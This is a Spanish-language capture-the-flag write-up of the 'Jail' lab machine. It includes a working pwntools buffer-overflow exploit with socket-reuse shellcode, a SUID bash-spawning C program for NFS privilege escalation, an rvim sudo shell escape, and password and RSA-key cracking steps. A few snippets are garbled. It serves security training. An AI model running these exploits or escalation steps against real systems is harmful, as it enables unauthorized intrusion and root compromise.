---------
- Tags: #buffer-overflow #socket-re-use #gdb #nfs #rvim #password-crack #crypto 
----------
## Técnicas utilizadas
- Code Analysis  
- Buffer Overflow x32 - Socket Re-Use Shellcode Technique  
- GDB Tips  
- NFSv3 Privesc  
- Abusing sudoers privilege (rvim command)  
- Cracking RAR file  
- Crypto Challenge (Playing with RsaCtfTool to get the private key)
## Procedimiento
![[Pasted image 20230801184154.png]]

-----------
#### Reconocimiento
Un escaneo con **nmap** sobre los servicios corriendo en la maquina nos reporta lo siguiente:
```java
# nmap -sCV -p22,80,111,2049,7411,20048 -oN Ports 10.10.10.34
Nmap scan report for 10.10.10.34
Host is up (0.14s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 cdec197cdadc16e2a39d42f3184be64d (RSA)
|   256 af949f2f21d0e01dae8e7f1d7bd742ef (ECDSA)
|_  256 6bf8dc274f1c8967a467c5ed0753af97 (ED25519)
80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS)
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      38984/tcp   nlockmgr
|   100021  1,3,4      46116/tcp6  nlockmgr
|   100021  1,3,4      54444/udp6  nlockmgr
|   100021  1,3,4      57662/udp   nlockmgr
|   100024  1          51131/tcp6  status
|   100024  1          54508/udp6  status
|   100024  1          54933/udp   status
|   100024  1          58034/tcp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl    3 (RPC #100227)
7411/tcp  open  daqstream?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    OK Ready. Send USER command.
20048/tcp open  mountd     1-3 (RPC #100005)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7411-TCP:V=7.93%I=7%D=8/4%Time=64CC6AD4%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(GenericLines,1D,
SF:"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(GetRequest,1D,"OK\x20
SF:Ready\.\x20Send\x20USER\x20command\.\n")%r(HTTPOptions,1D,"OK\x20Ready\
SF:.\x20Send\x20USER\x20command\.\n")%r(RTSPRequest,1D,"OK\x20Ready\.\x20S
SF:end\x20USER\x20command\.\n")%r(RPCCheck,1D,"OK\x20Ready\.\x20Send\x20US
SF:ER\x20command\.\n")%r(DNSVersionBindReqTCP,1D,"OK\x20Ready\.\x20Send\x2
SF:0USER\x20command\.\n")%r(DNSStatusRequestTCP,1D,"OK\x20Ready\.\x20Send\
SF:x20USER\x20command\.\n")%r(Help,1D,"OK\x20Ready\.\x20Send\x20USER\x20co
SF:mmand\.\n")%r(SSLSessionReq,1D,"OK\x20Ready\.\x20Send\x20USER\x20comman
SF:d\.\n")%r(TerminalServerCookie,1D,"OK\x20Ready\.\x20Send\x20USER\x20com
SF:mand\.\n")%r(TLSSessionReq,1D,"OK\x20Ready\.\x20Send\x20USER\x20command
SF:\.\n")%r(Kerberos,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(
SF:SMBProgNeg,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(X11Prob
SF:e,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(FourOhFourReques
SF:t,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(LPDString,1D,"OK
SF:\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(LDAPSearchReq,1D,"OK\x20
SF:Ready\.\x20Send\x20USER\x20command\.\n")%r(LDAPBindReq,1D,"OK\x20Ready\
SF:.\x20Send\x20USER\x20command\.\n")%r(SIPOptions,1D,"OK\x20Ready\.\x20Se
SF:nd\x20USER\x20command\.\n")%r(LANDesk-RC,1D,"OK\x20Ready\.\x20Send\x20U
SF:SER\x20command\.\n")%r(TerminalServer,1D,"OK\x20Ready\.\x20Send\x20USER
SF:\x20command\.\n")%r(NCP,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\
SF:n")%r(NotesRPC,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(Jav
SF:aRMI,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(WMSRequest,1D
SF:,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(oracle-tns,1D,"OK\x2
SF:0Ready\.\x20Send\x20USER\x20command\.\n")%r(ms-sql-s,1D,"OK\x20Ready\.\
SF:x20Send\x20USER\x20command\.\n")%r(afp,1D,"OK\x20Ready\.\x20Send\x20USE
SF:R\x20command\.\n")%r(giop,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\
SF:.\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  4 03:07:38 2023 -- 1 IP address (1 host up) scanned in 173.02 seconds
```

Si lanzamos un **whatweb** sobre el aplicativo web, podemos observar las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.10.10.34
http://10.10.10.34 [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS)], IP[10.10.10.34]
```

-----------
#### Code Analysis  
Haciendo un reconocimiento de directorios en el sitio web, podemos llegar a dar con uno que contiene un script escrito en **C**, un compilador en **bash** y un **binario** compilado:
![[Pasted image 20230804031710.png]]

El contenido del script en **C** es el siguiente:
```c++
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

int debugmode;
int handle(int sock);
int auth(char *username, char *password);z
int auth(char *username, char *password) {
    char userpass[16];
    char *response;
    if (debugmode == 1) {
        printf("Debug: userpass buffer @ %p\n", userpass);
        fflush(stdout);
    }
    if (strcmp(username, "admin") != 0) return 0;
    strcpy(userpass, password);
    if (strcmp(userpass, "1974jailbreak!") == 0) {
        return 1;
    } else {
        printf("Incorrect username and/or password.\n");
        return 0;
    }
    return 0;
}
int handle(int sock) {
    int n;
    int gotuser = 0;
    int gotpass = 0;
    char buffer[1024];
    char strchr[2] = "\n\x00";
    char *token;
    char username[256];
    char password[256];
    debugmode = 0;
    memset(buffer, 0, 256);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    printf("OK Ready. Send USER command.\n");
    fflush(stdout);
    while(1) {
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("ERROR reading from socket");
            return 0;
        }
        token = strtok(buffer, strchr);
        while (token != NULL) {
            if (gotuser == 1 && gotpass == 1) {
                break;
            }
            if (strncmp(token, "USER ", 5) == 0) {
                strncpy(username, token+5, sizeof(username));
                gotuser=1;
                if (gotpass == 0) {
                    printf("OK Send PASS command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "PASS ", 5) == 0) {
                strncpy(password, token+5, sizeof(password));
                gotpass=1;
                if (gotuser == 0) {
                    printf("OK Send USER command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "DEBUG", 5) == 0) {
                if (debugmode == 0) {
                    debugmode = 1;
                    printf("OK DEBUG mode on.\n");
                    fflush(stdout);
                } else if (debugmode == 1) {
                    debugmode = 0;
                    printf("OK DEBUG mode off.\n");
                    fflush(stdout);
                }
            }
            token = strtok(NULL, strchr);
        }
        if (gotuser == 1 && gotpass == 1) {
            break;
        }
    }
    if (auth(username, password)) {
        printf("OK Authentication success. Send command.\n");
        fflush(stdout);
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("Socket read error");
            return 0;
        }
        if (strncmp(buffer, "OPEN", 4) == 0) {
            printf("OK Jail doors opened.");
            fflush(stdout);
        } else if (strncmp(buffer, "CLOSE", 5) == 0) {
            printf("OK Jail doors closed.");
            fflush(stdout);
        } else {
            printf("ERR Invalid command.\n");
            fflush(stdout);
            return 1;
        }
    } else {
        printf("ERR Authentication failed.\n");
        fflush(stdout);
        return 0;
    }
    return 0;
}
int main(int argc, char *argv[]) {
    int sockfd;
    int newsockfd;
    int port;
    int clientlen;
    char buffer[256];
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    int n;
    int pid;
    int sockyes;
    sockyes = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &sockyes, sizeof(int)) == -1) {
        perror("Setsockopt error");
        exit(1);
    }
    memset((char*)&server_addr, 0, sizeof(server_addr));
    port = 7411;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind error");
        exit(1);
    }
    listen(sockfd, 200);
    clientlen = sizeof(client_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &clientlen);
        if (newsockfd < 0) {
            perror("Accept error");
            exit(1);
        }
        pid = fork();
        if (pid < 0) {
            perror("Fork error");
            exit(1);
        }
        if (pid == 0) {
            close(sockfd);
            exit(handle(newsockfd));
        } else {
            close(newsockfd);
        }
    }
}
```

Si ejecutamos el binario, vemos que se nos habre el puerto **7411** ofreciendo un servicio, si nos conectamos a este, caemos en cuenta que es el mismo que esta corriendo la maquina:
```
nc 127.0.0.1 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS admin
Incorrect username and/or password.
ERR Authentication failed.
```

Reviesando el script, podemos encontrar un par de condicionales que contienen unas credenciales:
```c
if (strcmp(username, "admin") != 0) return 0;
strcpy(userpass, password);
if (strcmp(userpass, "1974jailbreak!") == 0) {
```

Si corremos ahora el servicio y proporcinamos las credenciales vemos un mensaje de que nos autenticamos correctamente:
```
nc 127.0.0.1 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS 1974jailbreak!
OK Authentication success. Send command.
```

Echandole otra repasada al **script** encontramos un error de asignación de buffer en una variable:
![[Pasted image 20230804032256.png]]

------------------
#### Buffer Overflow x32 - Socket Re-Use Shellcode Technique  
Esto puede ocacionar un desbordamiento de memoria y darnos la posibilidad de redirigir el flujo del programa a donde nosotros deseemos.
Ahora, con **gdb** intentaremos desboardar el buffer para ver a bajo nivel que es lo que esta sucediendo:
```
# gdb ./jail
```

Cabe mencionar que necesitamos mover unas configuraciónes en **gef** para que funcione correctamente:
```
gef> set detach-on-fork off
gef> set follow-fork-mode child
```

Con esto configurado, podemos conectarnos al servicio y tomara correctamente los valores. Revisando las protecciones del binario con **checksec** encontramos que no cuenta con ninguna:
```json
gef➤ checksec
[+] checksec for '/home/sexcott/Desktop/Machines/Jail/content/10.10.10.34/jailuser/dev/jail'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Si lo volvemos a correr, nos mostrara un error, lo vamos a solucionar matando el proceso:
```
# kill -9 <PID>
```

Lo siguiente sera ver cuantos caracteres necesitamos antes de sobreescribir **EIP** asi que crearemos un patrón:
```
gef> pattern create
 M-...........................................,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,LÇ```

Y posteriormente pasarle el registro para que nos represente cuantos caracteres son necesarios:
```
gef> pattern offset $eip
```

Como no esta habilitado el **NX** ( Data Execution Prevention ) podemos aprovecharnos de la pila (**ESP**) para inyectar **Shell Code**, osea, en el sitio donde deberia haber 8 letras **C** colariamos una instrucción maliciosa a bajo nivel.

**Listamos lo que hay en la pila (ESP)**:
```
	gef> x/80wx bg_______
	
	__
```

**Listamos lo que hay en la pila (ESP) a nivel de strings**:
```
gef> x/s $esp 
```

Si ponemos el modo debug a la hora de ejecuta el binario, y desbordamos el Buffer podemos ver que se leekea una dirección:
```
nc 127.0.0.1 7411
OK Ready. Send USER command.
DEBUG on
OK DEBUG mode on.
A^?
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCC
Debug: userpass buffer @ --------------> 0xffffc950
```

Con **gdb** podemos ver el valor de esta dirección:
```
gef> x/s 0xffffc950
```

Sabiendo esto, ahora podemos proceder con un script en **Python**:
```python
#!/usr/bin/python3

from pwn import *

context(os="linux", arch="i386")
p = remote("127.0.0.1", 7411)

offset = 28
before_eip = b"A"*offset
EIP = p32(0xffffc8e0+32)
# Lo sacamos de https://www.exploit-db.com/shellcodes/34060, y lo hacemos asi, por que al parecer el espacio es limitado.
buf = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf += b"\x89\xe3\x31\xc9\xcd\x80"

p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"PASS" + before_eip + EIP + buf)

p.interactive()
```


-------------
#### NFSv3 Privesc 
Reviesando los privilegios que tenemos a nivel de Sudoers encontramos uno:
```
$ sudo -l
Matching Defaults entries for nobody on this host:
    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME
    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User nobody may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh
```

Bien, con esto aún no podemos llegar a nada, asi que falta enumerar más. Si volvemos a los puertos que estaban abiertos, vemos que estaba el **NFS**:
![[Pasted image 20230804044432.png]]

Pues ahora con `showmount -e` podemos listar los directorios que podemos montar de manera local:
```
# showmount -e 10.10.10.10
```

Y podemos montar estos directorios:
```
# mount -t nfs 10.10.10.10:/opt /mnt/opt && mount -t nfs 10.10.10.10:/var/nfsshare /mnt/shares
```

Si listamos los permisos de estos directorios, vemos que como el indentificador **1000** pertenece a nuestro usuario a nivel de sistema, podemos atravesar uno de estos directorios y además escribir archivos:
![[Pasted image 20230804044525.png]]

Podemos listar el archivo creado en la maquina victima **/var/nfsshare/archivo** y podriamos ver quien creo el archivo:
![[Pasted image 20230804044553.png]]

Vemos que lo creo **Frank**, entonces, podemos crear un archivo que nos ejecute una bash y otorgarle el privilegio **SUID** para ejecutarlo como el usuario **Frank** y pivotar al usuario:
```c
#include <stdio.h>
#include <stdlib.h>

int main(void){
	setreuid(1000, 1000);
	system("/bin/bash");
	return 0;
}
```

Lo compilamos con `gcc shell.c -o shell`, luego `chmod 4755 shell` y ahora al ejecutarlo desde la maquina deberianmos ser **Frank**. Si esto no funciona al ejecutarlo, podemos hacerlo desde un contenedor creado y gestionado con **Docker**:
```
# docker run -it --rm ubuntu:latest bash
```

Y desde aqui hacemos lo siguiente.

---------------
#### Abusing sudoers privilege (rvim command)
Una vez como **Frank** podemos meter nuestra **id_rsa.pub** dentro de su **Authorized_keys** para iniciar sesión con **SSH** sin contraseña y estar en una **SHELL** más comoda.
Probablemente nos vaya a dar error al conectarnos por **SSH**, asi que tendriamos que cambiar el algoritmo y generar un **id_rsa.pub** con otro formato:
```
# ssh-keygen -t ecdsa -b 521
```

Y la metemos en el **Authorized_keys** y ahora si tendriamos que poder.

Listando nuestro privilegio a nivel de sudoers vemos uno nuevo:
```
[frank@localhost ~]$ sudo -l
Matching Defaults entries for frank on this host:
    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User frank may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh
	(adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

Bien, sabemos que si entramos al editor **VIM** y ejecutamos algun comando desde ahi, lo estariamos ejecutando como el usuario **adm**. Pues bien, [GTFobins](https://gtfobins.github.io/gtfobins/rvim/) tiene contemplada una forma de spawnear una shell:
```
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```

-------------------
#### Cracking RAR file  
Dentro de nuestro directorio personal, vemos una carpeta de nombre **.keys** dentro, vemos algunas cosas:
![[Pasted image 20230804045703.png]]

En la nota que le dejo **Administrator** a **Frank** nos dan un **Hint** de como seria la **Password** de **Frank**:
```
Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
```

Bien, nos vamos a traer el **.rar** a nuestra maquina para jugar con el. Tambien, dentro de un directorio podemos ver una archivo de texto que parece tener un texto cifrado:
```
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
```

Vamos a usar [Quipquip](https://quipqiup.com/) para dar con la cadena verdadera y el resultado es esta:
```
Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!
```

Nos da una pista bastante grande, dado que mencionan **Alcatraz** y al googlear por este seguido de **Frank** nos aparece un Nombre, Apellido y año que escapo de la carcel:
![[Pasted image 20230803174217.png]]

Con estas pistas en nuestra disposicion, vamos a crear un diccionario con **Crunch**:
```
# crunch 11 11 -t Morris1962^ > passwords.txt
```

Ahora con `rar2john` vamos a extraer un **hash** el cual vamos a intentar romper con el diccionario que acabamos de crear:
```
# john hash -w=/usr/share/wordlists/rockyou.txt
```

Y nos encuentra la contraseña:
![[Pasted image 20230804050238.png]]

Es la contraseña del archivo comprimido, asi que ahora podemos descomprimirlo y en su interior, podemos ver un archivo de texto que contiene una **clave publica**. Con la herramienta [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) intentaremos romperla:
```
#python3 RsaCtfTool.py --publickey $(pwd)/key.pub --private
```

Y nos da como resultado la clave privada del usuario root:
![[Pasted image 20230804051241.png]]
Con esta podemos conectarnos como **Root** por **SSH**:
```
# ssh -i id_rsa -o 'PubKeyAcceptedKeyTypes +ssh-rsa' root@10.10.10.10
```






